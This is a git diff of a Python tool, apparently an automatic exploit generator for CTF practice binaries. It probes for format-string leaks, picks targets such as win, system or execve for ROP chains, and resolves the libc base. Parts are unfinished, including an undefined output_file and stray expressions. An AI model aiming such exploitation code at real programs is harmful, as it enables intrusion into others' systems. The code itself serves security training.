@@ -3,7 +3,6 @@ import os, subprocess
 import logging
 import argparse
 import ropgadget
-import r2pipe
 
 from pwn import *
 from binascii import *
@@ -40,22 +39,21 @@ class Raeg:
         self.proj = angr.Project(self.binary, load_options={"auto_load_libs":False})
         self.cfg = self.proj.analyses.CFGFast()
 
+
         self.exploit_function = None
 
         self.rop_chain = None
         self.chain_length = 0
         self.string_address = None
 
+
         self.symbolic_padding = None
 
-        self.libc_offset_string = "%p"
-        self.canary_offset_string = None
         self.format_write_address = None
 
         self.has_leak = False
         self.has_overflow = False
         self.has_libc_leak = False
-
 
         self.flag = None
 
@@ -65,11 +63,8 @@ class Raeg:
 
         # First find if it is a format string vulnerability
         p = self.start_process()
-
         prompt = p.recvline()
-        print(prompt)
         p.sendline(b"%p")
-        output = b""
         try:
             p.recvuntil(b"<<<")
             output = p.recvline()
@@ -85,22 +80,24 @@ class Raeg:
 
             self.format_leak()
             symbols = []
-            if "pwnme" in self.elf.sym.keys():
-                logging.getLogger("pwnlib").setLevel(logging.INFO)
-                log.info("Found a format overwrite with the pwnme variable")
-                logging.getLogger("pwnlib").setLevel(logging.CRITICAL)
-            elif "win" in self.elf.sym.keys() and "pwnme" not in self.elf.sym.keys():
-                logging.getLogger("pwnlib").setLevel(logging.INFO)
-                log.info("Found a win function with a format got overwrite")
-                logging.getLogger("pwnlib").setLevel(logging.CRITICAL)
-                self.format_write()
-                self.exploit_function = "win"
-            elif "fopen" in self.elf.sym.keys():
-                logging.getLogger("pwnlib").setLevel(logging.INFO)
-                log.info("Found a format read")
-                logging.getLogger("pwnlib").setLevel(logging.CRITICAL)
-            else:
-                self.angry_stack_smash()
+
+            for symb in self.elf.sym:
+                if symb == "pwnme":
+                    logging.getLogger("pwnlib").setLevel(logging.INFO)
+                    log.info("Found a format overwrite with the pwnme variable")
+                    logging.getLogger("pwnlib").setLevel(logging.CRITICAL)
+                    symbols.append("pwnme")
+                if symb == "win" and "pwnme" not in symbols:
+                    logging.getLogger("pwnlib").setLevel(logging.INFO)
+                    log.info("Found a win function with a format got overwrite")
+                    logging.getLogger("pwnlib").setLevel(logging.CRITICAL)
+                    self.format_write()
+                    self.exploit_function = "win"
+                if symb == "fopen":
+                    logging.getLogger("pwnlib").setLevel(logging.INFO)
+                    log.info("Found a format read")
+                    logging.getLogger("pwnlib").setLevel(logging.CRITICAL)
+                    symbols.append("fopen")
 
 
         else:
@@ -125,31 +122,32 @@ class Raeg:
 
             params = []
             # Find functions to use for exploit by enumerating through one win exploit functions
-            #for symb in self.elf.sym.keys:
-            if "win" in self.elf.sym.keys():
-                # Either ret2win, rop parameters, or format got overwrite
-                self.exploit_function = "win"
-                log.info("Found win function")
-            elif "system" in self.elf.sym.keys():
-                self.exploit_function = "system"
-                log.info("Found system function")
-                params = [self.string_address, p64(0)]
-            elif "execve" in self.elf.sym.keys():
-                self.exploit_function = "execve"
-                params = [self.string_address, p64(0), p64(0)]
-                log.info("Found execve function")
-            elif "syscall" in self.elf.sym.keys():
-                self.exploit_function = "syscall"
-                log.info("Found syscall function")
-                params = [self.string_address, p64(0), p64(0)]
-            elif "print_file" in self.elf.sym.keys():
-                self.exploit_function = "print_file"
-                log.info("Found print_file function")
-                params = [self.string_address]
-            elif "puts" in self.elf.sym.keys():
-                self.exploit_function = "puts"
-                log.info("Found puts function")
-
+            for symb in self.elf.sym:
+                if symb == "win":
+                    # Either ret2win, rop parameters, or format got overwrite
+                    self.exploit_function = "win"
+                    log.info("Found win function")
+                    break
+                elif symb == "system":
+                    self.exploit_function = "system"
+                    log.info("Found system function")
+                    params = [self.string_address, p64(0)]
+                    break
+                elif symb == "execve":
+                    self.exploit_function = "execve"
+                    params = [self.string_address, p64(0), p64(0)]
+                    log.info("Found execve function")
+                    break
+                elif symb == "syscall":
+                    self.exploit_function = "syscall"
+                    log.info("Found syscall function")
+                    params = [self.string_address, p64(0), p64(0)]
+                    break
+                elif symb == "print_file":
+                    self.exploit_function = "print_file"
+                    log.info("Found print_file function")
+                    params = [self.string_address]
+                    break
 
             # Set functions and parameters as a dictionary set
 
@@ -230,6 +228,8 @@ class Raeg:
             log.warning("Failed to smash stack")
 
     def find_arguments(self, function, goal):
+
+
         return None
 
     
@@ -417,18 +417,30 @@ class Raeg:
         return chain
 
     def rop_libc(self):
-        p = process(self.binary)
+        #p = process(self.binary)
+        gs = f'''
+            init-pwndbg
+            set context-sections regs
+            b main
+        '''
+
+        p = gdb.debug(self.binary, gdbscript=gs)
 
 
         prompt = p.recvline()
         if b"Leak" in prompt:
             self.leak = int(prompt.split(b":")[1].strip(b"\n"),16)
-            log.info(f"Libc address leaked {hex(self.leak)}")
-            self.resolve_libc_offset()
+            log.info(f"Libc address given {hex(self.leak)}")
+            self.resolve_libc_offset(self.leak)
         else:
 
             if self.offset_str != None:
                 p.sendline(bytes(self.offset_str, "utf-8"))
+        p.close()
+        fp = open(output_file, "r")
+        debug_output = fp.readlines()
+        for line in debug_output:
+            print(line)
 
 
 
@@ -522,46 +534,18 @@ class Raeg:
         return None
 
     # Function to resolve the libc base offset from the leak
-    def resolve_libc_offset(self):
+    def resolve_libc_offset(self, leak):
 
-        print(self.libc_offset_string)
-        self.r2 = r2pipe.open(self.binary, flags=["-d", "rarun2", f"program={self.binary}", f"stdin=./test"])
+        # Get libc base from debugger/angr
+        cmd = f"ldd {self.binary} | grep libc"
+        cmd_output = subprocess.Popen(cmd, shell=True, stdout=subprocess.PIPE, stderr=None)
+        libc_base = cmd_output.communicate()[0].decode().split("(")[1].split(")")[0]
+        log.info(f"Libc base at {libc_base}")
+        log.info(f"Libc base at {self.libc.address}")
 
+        self.libc
 
-        # Random r2pipe commands that gets the memory map of the libc base and runs the program for the leak
-
-        self.r2.cmd("aa")
-        self.r2.cmd("dcu main")
-        self.r2.cmd("dm | grep libc -m 1")
-        libc_base_debug = self.r2.cmd("dc")#.split("\n")[1].split(" ")[0]
-        self.r2.cmd("dc")
-        debug_output = self.r2.cmd("aa")
-        self.r2.cmd("aa")
-        self.r2.cmd("dc")
-        self.r2.cmd("aa")
-
-        #set logging file ./pwndbg.log
-        #set logging enabled on
-
-
-        log.info("Found output in debugger")
-        print(debug_output)
-        log.info("Found libc in debugger")
-        print(libc_base_debug)
-
-        log.info("Found libc in debugger")
-        for line in libc_base_debug.split("\n"):
-            print(line)
-
-        gs = '''
-            init-pwndbg
-            b main
-            set context-sections disasm
-            vmmap libc
-        '''
-
-        #p = gdb.debug(self.binary, gdbscript=gs)
-        #p.sendline(bytes(self.libc_offset_string, "utf-8"))
+        self.libc.address
 
         return None
 
